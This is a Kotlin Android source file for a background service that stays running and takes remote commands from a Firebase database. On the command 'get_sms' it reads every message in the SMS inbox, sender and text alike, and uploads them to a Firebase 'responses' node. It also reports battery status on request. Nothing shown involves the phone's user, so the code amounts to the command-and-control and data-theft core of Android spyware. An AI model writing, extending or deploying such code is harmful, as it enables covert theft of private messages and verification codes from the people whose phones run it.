package com.my.darkmatter

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.IBinder
import android.provider.Telephony
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class BackgroundService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        listenForFirebaseCommands()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun listenForFirebaseCommands() {
        val database = FirebaseDatabase.getInstance().getReference("commands")
        database.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val command = snapshot.getValue(String::class.java)
                when (command) {
                    "battery_status" -> sendBatteryStatus()
                    "get_sms" -> sendSMSData()
                    else -> {

                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                // Handle potential errors here
            }
        })
    }

    private fun sendBatteryStatus() {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            applicationContext.registerReceiver(null, filter)
        }
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = level * 100 / scale.toFloat()
        val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING

        val database = FirebaseDatabase.getInstance().getReference("responses")
        database.child("battery_percentage").setValue(batteryPct)
        database.child("charging_status").setValue(isCharging)
    }

    private fun sendSMSData() {
        val smsList = mutableListOf<Map<String, String>>()
        val uri = Telephony.Sms.Inbox.CONTENT_URI
        val cursor = contentResolver.query(uri, null, null, null, null)

        cursor?.use {
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)

            while (it.moveToNext()) {
                val address = it.getString(addressIndex)
                val body = it.getString(bodyIndex)
                val sms = mapOf("address" to address, "body" to body)
                smsList.add(sms)
            }
        }

        val database = FirebaseDatabase.getInstance().getReference("responses")
        database.child("sms_inbox").setValue(smsList)
    }
}